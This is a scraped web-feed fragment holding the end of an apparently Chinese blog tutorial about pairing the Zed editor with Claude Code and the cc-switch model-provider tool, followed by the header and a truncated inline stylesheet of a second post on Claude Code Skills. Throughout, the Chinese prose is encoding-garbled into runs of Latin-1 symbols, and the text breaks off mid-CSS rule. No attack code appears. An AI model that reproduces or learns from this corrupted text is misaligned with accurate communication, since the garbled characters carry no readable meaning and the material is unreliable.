<p>ç›´æ¥ä½¿ç”¨ç½‘é¡µç‰ˆçš„ AI é€šå¸¸è¿˜ä¼šæœ‰æ–‡ä»¶æ•°é‡çš„é™åˆ¶ï¼Œæ¯”å¦‚è¯´å¤§äº10 ä¸ª æˆ– 50ä¸ªé™„ä»¶å°±æ²¡æ³•å¤„ç†</p>
<hr/>
<p>æ¥ä¸‹æ¥è®²ä¸€ä¸‹éœ€è¦å¤§æ¦‚çš„å®‰è£…å’Œä½¿ç”¨è¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/453794d0dfd04bcdbb565c24b1538a83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=%2FL2PCR6E6A3eVX3c1WZqPRFbWS4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¼ é€é—¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzed.dev%2F" target="_blank" title="https://zed.dev/" ref="nofollow noopener noreferrer">zed.dev/</a></p>
<p>æˆ‘æ„Ÿè§‰ Zed æ›´åƒæ˜¯è®°äº‹æœ¬å’Œ AI coding å·¥å…·çš„ä¸€ä¸ªæŠ˜ä¸­ï¼Œæ›´è½»é‡ä¸€äº›ï¼Œæ™®é€šäººç”¨èµ·æ¥æ²¡æœ‰é‚£ä¹ˆå“äººã€‚</p>
<p>ä¸‹è½½å’Œå®‰è£…éå¸¸ç®€å•ï¼Œå’Œæ™®é€šè®°äº‹æœ¬è½¯ä»¶ï¼Œå¦‚è¯­é›€ã€çŸ³å¢¨æ–‡æ¡£ç­‰ï¼Œæ²¡æœ‰å¤ªå¤§åŒºåˆ«ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50e4b9d063574568af92e8b1fdc6a7ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=kr8IFAcAD599d27KcUwWk80rBNc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®‰è£…ä¹‹åæ‰“å¼€ï¼Œå’Œä¼ ç»Ÿçš„è®°äº‹æœ¬è½¯ä»¶åŒºåˆ«ä¸å¤§ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1568f4cc7434cb89f0945068f976ae7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=mcKVTsqbsQ9iwZSkZcehGT70KZ4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨å³ä¸Šè§’æ˜¯å¯ä»¥è¿›è¡Œè®¾ç½®ã€åˆ‡æ¢åˆ°ä¸»é¢˜ï¼Œå®‰è£…æ’ä»¶ä¹‹ç±»çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cea408bd546541e9811d330bf864dccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=lKxqjYF8VvojHlCloLJYHzBJr0g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æœ€å¸¸ç”¨çš„æ˜¯å·¦ä¸‹è§’çš„é‚£ä¸ªå±•ç¤ºç›®å½•å†…å®¹ï¼Œç„¶åå³ä¾§çš„æœ‰ä¸€ä¸ª AI çš„æŒ‰é’®ï¼Œè¿˜æœ‰ç»ˆç«¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd8b7346263d4bd4950938271b6d1b61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=ShcK0DFVa1aKj2oCeSIf%2FP3UurA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚è¯´ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨å³ä¾§å¯¹å½“å‰æ–‡ä»¶å¤¹é‡Œé¢çš„ä»»ä½•å†…å®¹è¿›è¡Œæé—®ï¼Œä½ ä¹Ÿå¯ä»¥@ä»»ä½•æ–‡ä»¶ï¼Œæˆ–è€…é€‰ä¸­æ–‡ä»¶çš„ä¸€ä¸ªéƒ¨åˆ†ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œè®©å®ƒå¤„ç†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f3a5cb3ec8d4bfc8b86adc89d9b4448~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=8xwtgA7p1%2F3YiqFdKP%2FND4YS0WY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ç‚¹æ˜¯ä½ åœ¨è¿™é‡Œè®© AI å»å®Œæˆä¸€äº›ä»»åŠ¡ï¼Œå½“å®Œæˆä¹‹åå‘¢ï¼Œè¿™ä¸ªè½¯ä»¶ä¼šæœ‰ä¸€ä¸ªæ¶ˆæ¯æé†’ï¼Œä½ å¯ä»¥ç¬¬ä¸€æ—¶é—´å›æ¥çœ‹ç»“æœã€‚</p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab9c7a722f9144fe824ae3b65d721be2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=1DvlMVr8OSD66Nsk2vFa9lzPVMo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¼ é€é—¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch%2Ftree%2Fmain" target="_blank" title="https://github.com/farion1231/cc-switch/tree/main" ref="nofollow noopener noreferrer">github.com/farion1231/â€¦</a></p>
<p>ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffarion1231%2Fcc-switch%2Freleases" target="_blank" title="https://github.com/farion1231/cc-switch/releases" ref="nofollow noopener noreferrer">github.com/farion1231/â€¦</a></p>
<p>å¤§å®¶ä¸æ„¿æ„ä½¿ç”¨ Claude Code ä¸€ä¸ªé‡è¦åŸå› å°±æ˜¯é…ç½®å¤ªå¤æ‚ï¼Œå¯¹äºæ™®é€šäººæ¥è¯´å¤ªå¤æ‚äº†ã€‚æˆ‘ä»¬å¯ä»¥å®‰è£…è¿™ä¸ª cc-switchï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥ç”¨å¯è§†åŒ–çš„ç•Œé¢è¿›è¡Œé…ç½®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c6d566a3a9a48468afaa0f229f101d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=OA0MaoStOL3x4OllgvsHmjhCjLc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™é‡Œæ”¯æŒç”¨å¯è§†åŒ–ç•Œé¢çš„æ–¹å¼å»é…ç½®æ¨¡å‹æœåŠ¡å•†ï¼Œé»˜è®¤å·²ç»æ”¯æŒ Zhipu GLMã€Kimiã€DeepSeekã€OpenRouter ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a3b4bd22daf4b528950e335e353344d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=aD0TDWt5VCukANJ%2B2rCiYrc59uw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨è¿™é‡Œé…ç½®æ¨¡å‹æœåŠ¡å•†çš„è¯·æ±‚åœ°å€å’Œæ¨¡å‹åç§°ç­‰ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3bcf81c16ab4d2ab3e3c87e1ab77e67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=qf6utL5eIdJ8HbaPQ7l%2Fyji49jI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é…ç½®å®Œæˆä¹‹åå¯ä»¥åœ¨è¿™é‡Œå¯¹ä¸åŒçš„æ¨¡å‹æœåŠ¡å•†è¿›è¡Œå¿«é€Ÿåˆ‡æ¢ã€‚</p>
<p>è¿˜å¯ä»¥è½»æ¾åœ°å®‰è£… Skills ï¼Œç„¶åè®¾ç½®ç³»ç»Ÿæç¤ºè¯ä»¥åŠå®‰è£… MCPç­‰ï¼Œæ„Ÿå…´è¶£è‡ªå·±ç ”ç©¶ï¼Œè¿™é‡Œå…ˆä¸å±•å¼€ä»‹ç»ã€‚</p>
<hr/>
<p><strong>é‚£ä¹ˆæ¥ä¸‹æ¥ä»–ä»¬æ€ä¹ˆç»“åˆåœ¨ä¸€èµ·å‘¢ï¼Ÿ</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9241e20f7ec4ea5b766c58cdbd610e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=X%2FQ7SlDOAzFOXLIQO3w0XCrBW0U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚è¯´æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ‰ä¸ªè‹±æ–‡çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªè½¯ä»¶æŠŠæ–‡ä»¶å¤¹æ‰“å¼€ã€‚</p>
<p>å¯ä»¥ Â File - Open æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†æ–‡ä»¶å¤¹æ‹–çª—å£ä¸­ã€‚</p>
<p>æˆ‘ä»¬æ‰“å¼€å³ä¸‹è§’çš„è¿™ä¸ª AI æŒ‰é’®å°±å¯ä»¥å±•å¼€é‚£ä¸ªä¾§è¾¹æ ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© Claude Codeã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/007dc529f35b40adacb61181d8007d43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=xiX7p%2B0iYHGo2gm45OvSV5Ub4pE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥è®©ä»–å¯¹è¿™ä¸ªæ–‡æ¡£è¿›è¡Œç¿»è¯‘ï¼Œä¹‹åå†™åˆ°æˆ‘ä»¬çš„æœ¬åœ°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcbdf1a46e7e4bdbb4e7ac1c003681f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=mACKEyUMJiIMXeKAejc4VViOHdY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å³ä¸‹è§’è¾“å…¥æ é™„è¿‘å¯ä»¥é€‰æ‹©æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥é€‰æ‹© cc-swtich ä¸­å¯åŠ¨çš„æœåŠ¡å•†ä¸­é…ç½®çš„æ¨¡å‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5675a143527d48359834159d3b9b19a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=jnFESHw36R7g22hjbe3VWY2XDeU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯ä»¥å·¦ä¸‹è§’çš„ @ å›¾æ ‡ï¼Œå¯ä»¥å»æ·»åŠ æ–‡ä»¶ã€è§„åˆ™ç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥åœˆé€‰ä¸€äº›æ–‡æœ¬ç›´æ¥æ·»åŠ åˆ°æ™ºèƒ½ä½“çš„å¯¹è¯æ¡†ä¸­ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å°±ä¸éœ€è¦æŠŠæ–‡ä»¶ä½œä¸ºé™„ä»¶ä¸Šä¼ åˆ°æŸä¸ª AI çš„ç½‘é¡µç‰ˆï¼Œç„¶åç¿»è¯‘å®Œäº†ä¹‹åå†åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å†æŠŠå®ƒç²˜è´´å›æ¥ï¼Œåå¤çš„æŠ˜è…¾ã€‚</p>
<p>å½“ç„¶ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰ï¼Œå…¶ä»–ç±»ä¼¼çš„åœºæ™¯éƒ½å¯ä»¥ç”¨èµ·æ¥ã€‚</p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥ä¸º Claude Code å®‰è£… Skill å’Œ MCP çš„ï¼Œ Zed æœ¬èº«ä¹Ÿæ˜¯æ”¯æŒä½ å»å®‰è£…ä¸€äº› MCPã€ä¸»é¢˜ä¹‹ç±»çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18b489e9d5a041a3871d72e8aaa13e04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=jb%2FOM2pOw7rSk6mmjmbQnWgkAKQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”å¦‚è¯´æˆ‘è‡ªå·±è®¾è®¡äº†ä¸€ä¸ªå­—å¹•æ ¡å¯¹çš„skillï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥@è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè®© Claude Code è°ƒç”¨æˆ‘çš„ ã€Œå­—æ¯æ ¡å¯¹ Skillã€è¿›è¡Œå­—å¹•æ ¡å¯¹å•¦ã€‚</p>
<p>Skills ç›¸å…³æ–‡ç« ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3NzI0MzAyNA%3D%3D%26mid%3D2247490474%26idx%3D1%26sn%3D9f5bda014ef970e336cb3087885a930b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3NzI0MzAyNA==&amp;mid=2247490474&amp;idx=1&amp;sn=9f5bda014ef970e336cb3087885a930b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ç»ˆäºæœ‰äººæŠŠ Claude Skills çš„æ¦‚å¿µç»™æˆ‘è®²æ˜ç™½äº†ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3NzI0MzAyNA%3D%3D%26mid%3D2247490551%26idx%3D1%26sn%3D95846f10bd9d59a0d4c7515a0da6ac0b%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3NzI0MzAyNA==&amp;mid=2247490551&amp;idx=1&amp;sn=95846f10bd9d59a0d4c7515a0da6ac0b&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æé€Ÿåˆ›å»ºä¸€ä¸ªé«˜è´¨é‡çš„ Claude Skills æœ€ä½³å®è·µ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg3NzI0MzAyNA%3D%3D%26mid%3D2247490421%26idx%3D1%26sn%3De678c4a47a982007d4e7cb0660e69feb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg3NzI0MzAyNA==&amp;mid=2247490421&amp;idx=1&amp;sn=e678c4a47a982007d4e7cb0660e69feb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">å¦‚ä½•åœ¨ Qoderã€Cursorã€Traeã€Windsurf ç­‰ AI Coding å·¥å…·ä¸­ä½¿ç”¨ Claude Skills</a></p>
<p>å½“å‰ AI Coding è®©äº’è”ç½‘ä»ä¸šè€…è·å¾—äº†ä¸€äº›ä¼˜åŠ¿ï¼Œä½†æ˜¯ AI ç»å¯¹ä¸åªæ˜¯èƒ½å†™ä»£ç ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/124f61ba48214ef09d2cc5e768fd30d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=6uUUYDk4kMjtvZkyMt%2BcwVEzzko%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç°åœ¨éœ€è¦äººå»æ›´ä¸»åŠ¨åœ°å»å­¦ä¹ è¿™äº›ï¼ŒæŒæ¡è¿™äº›å·¥å…·çš„æœ€ä½³å®è·µï¼Œæ‰èƒ½å‘æŒ¥å‡º AI çš„æ›´å¤§ä»·å€¼ã€‚</p>
<p>æœªæ¥ AI ä¸€å®šæ˜¯å¯ä»¥å’Œæ›´å¤šè½¯ä»¶æ›´æ·±åº¦çš„èåˆï¼Œè®©æ›´å¤šéäº’è”ç½‘è¡Œä¸šçš„äººç¾¤ä¹Ÿèƒ½å¤Ÿæ›´å¥½åœ°äº«å—åˆ° AI å¸¦æ¥çš„åŠ©åŠ›ã€‚</p>
<p>åœ¨æœªæ¥è¿˜æ²¡æœ‰åˆ°æ¥ä¹‹å‰ï¼Œå¦‚æœä½ èƒ½å¤Ÿå…ˆæŒæ¡çš„è¯ï¼Œå°±ä¼šå…·æœ‰éå¸¸å¤§çš„å…ˆå‘ä¼˜åŠ¿ã€‚</p>
<p>æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>æ‚Ÿé¸£AI</strong>Â ï¼Œåç»­ä¼šé™†ç»­åˆ†äº«æ¯”è¾ƒæœ‰ç”¨çš„ AI å·¥å…·å’Œæ¯”è¾ƒå¥½çš„ AI ç»éªŒï¼Œæ¯”è¾ƒå®¢è§‚ç†æ€§çš„ AI è§‚ç‚¹ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a65fa40893d341c9ac438db6ebc49d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=lCdaRv09DLZBEpyAKsRTRQfKq28%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude Code Skills è‡ªä¼˜åŒ–æ¶æ„è®¾è®¡]]></title>    <link>https://juejin.cn/post/7594389937462804490</link>    <guid>https://juejin.cn/post/7594389937462804490</guid>    <pubDate>2026-01-13T02:15:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937462804490" data-draft-id="7594391758426898442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude Code Skills è‡ªä¼˜åŒ–æ¶æ„è®¾è®¡"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,è®¾è®¡æ¨¡å¼"/> <meta itemprop="datePublished" content="2026-01-13T02:15:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tiny_React"/> <meta itemprop="url" content="https://juejin.cn/user/1399041316887133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude Code Skills è‡ªä¼˜åŒ–æ¶æ„è®¾è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1399041316887133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tiny_React
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:15:57.000Z" title="Tue Jan 13 2026 02:15:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table 